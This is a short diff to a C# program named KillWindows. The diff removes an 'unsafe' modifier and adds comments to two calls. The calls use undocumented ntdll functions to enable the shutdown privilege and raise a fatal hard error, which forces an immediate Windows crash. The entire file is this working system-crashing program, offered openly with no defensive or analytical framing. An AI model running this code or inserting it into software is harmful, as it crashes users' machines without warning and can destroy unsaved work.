@@ -11,12 +11,12 @@ namespace KillWindows
         [DllImport("ntdll.dll")]
         public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
 
-        static unsafe void Main(string[] args)
+        static void Main(string[] args)
         {
             Boolean t1;
             uint t2;
-            RtlAdjustPrivilege(19, true, false, out t1);
-            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
+            RtlAdjustPrivilege(19, true, false, out t1); // Enable SeShutdownPrivilege
+            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2); // Shutdown
         }
     }
 }
